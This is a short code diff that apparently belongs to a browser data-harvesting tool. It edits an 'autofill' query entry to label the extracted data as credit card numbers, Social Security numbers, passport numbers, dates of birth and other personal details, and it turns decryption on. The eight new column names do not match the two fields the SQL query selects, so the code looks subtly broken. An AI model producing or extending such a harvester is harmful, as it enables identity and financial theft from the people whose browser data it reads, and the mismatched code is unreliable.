@@ -82,8 +82,17 @@ data_queries = {
     'autofill': {
         'query': 'SELECT field_name, field_value FROM autofill_data',
         'file': '\\Autofill Data',
-        'columns': ['Field Name', 'Field Value'],
-        'decrypt': False  # Modify decrypt value as needed
+        'columns': [
+            'Username',
+            'Address',
+            'Credit Card Number',
+            'Phone Number',
+            'Email',
+            'Date of Birth',
+            'Social Security Number',
+            'Passport Number'
+        ],
+        'decrypt': True  # Modify decrypt value as needed
     }
 }
 
